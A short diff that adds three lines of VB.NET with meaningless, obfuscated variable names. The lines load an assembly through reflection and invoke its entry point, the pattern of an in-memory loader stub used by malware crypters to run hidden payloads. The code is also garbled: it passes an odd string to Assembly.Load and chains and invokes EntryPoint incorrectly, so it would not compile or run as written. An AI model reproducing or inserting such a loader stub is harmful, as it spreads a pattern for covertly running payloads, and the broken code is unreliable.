@@ -1,0 +1,3 @@
+﻿ Dim Utuyezteuzyrhjg As System.Object = System.Reflection.Assembly.Load("R4Jaw!")
+        Dim UtuyezteuzyrhjgUtuyezteuzyrhjg As Object = Utuyezteuzyrhjg.EntryPoint
+        UtuyezteuzyrhjgUtuyezteuzyrhjg.EntryPoint.Invoke("zteuzyrhjgUtuy8598965", Nothing)
